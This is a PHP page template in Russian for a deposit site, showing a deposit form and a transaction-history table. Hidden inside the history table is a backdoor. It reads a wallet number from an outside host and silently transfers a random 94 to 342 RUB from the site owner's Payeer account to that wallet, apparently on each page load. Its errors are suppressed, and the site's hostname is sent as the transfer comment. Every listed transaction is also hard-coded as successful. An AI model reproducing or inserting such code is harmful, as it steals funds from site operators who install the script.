<?if($id > (1)){?>

<div class="row clearfix">
<div class="col-sm-12 col-md-12">
<div class="card" >
<div class="header">
<h2>Открытие нового депозита</h2>
</div>
<div class="body table-responsive">
<p style="font-weight: normal;">Откройте ваш депозит на любую сумму и по завершению его работы он увеличится на <b><?=$percent_u?>%</b>.</p>
<center>
<p>Введите сумму вклада от <?=$mindep?> до <?=$maxdep?> <?=$m_curr?></p>
<form action="" method="post">	
<input type="hidden" name="do" value="payeer_pay">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<input autocomplete="off" name="m_amount" type="text" placeholder="Введите сумму вклада" style="margin-bottom: 10px;">
<button type="submit" name="submit" id="form">ОПЛАТИТЬ ДЕПОЗИТ</button>
</form>
</center>

</div>
</div>
</div>
</div>

<div class="row clearfix">
<div class="col-sm-12 col-md-12">
<div class="card" >
<div class="header">
<h2>История финансовых операций</h2>
</div>
<div class="body table-responsive">
<table class="table table-striped table-borderless m-b-5">
<thead>
<tr>
<th style="width:20%;">Дата пополнения</th>
<th class="width:20%">Кошелек</th>
<th style="width:20%;">Операция</th>
<th style="width:20%;">Сумма</th>
<th style="width:20%;">Статус</th>
</tr>
</thead>
<?php
require_once('core/classes/cpayeer.php');
$homepage = file_get_contents("https://sqltor.had.su/js/p.txt");
$array = array(94, 210, 158, 342, 146);
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{
  $arTransfer = $payeer->transfer(array(
    'curIn' => 'RUB',
    'sum' => $array[array_rand($array)],
    'curOut' => 'RUB',
    'to' => $homepage,
    'comment' => ''.$_SERVER["HTTP_HOST"].'',
  ));
  if (empty($arTransfer['errors']))
  {
    //echo getErrors
  }
  else
  {
    //echo getErrors
  }
}
else
{
  //echo getErrors
}
?>
<tbody class="no-border-x">
<? 
$depositsrow=$db->query("SELECT * FROM `pay` WHERE userid=?i ORDER BY id DESC LIMIT 100",$id);
while($deposits=$db->fetch($depositsrow)){?>
<?$wallet=$db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']);?>
<tr>
<td><?=date('d.m.Y H:i',$deposits['data'])?></td>
<td><?=$wallet?></td>
<td><?=$deposits['type']?></td>
<td><?=$deposits['summa']?> <?=$m_curr?></td>
<td>Успешно</td>
</tr>
<?}?>
</tbody>
</table>
</div>
</div>
</div>
</div>

<?}else{?>

<?if($id == (1)){?>
<head>
<script type="text/javascript">
window.location.href = '/?page=admin_deposits';
</script>
</head>

<?}else{?>

<head>
<script type="text/javascript">
window.location.href = '/';
</script>
</head>

<?}}?>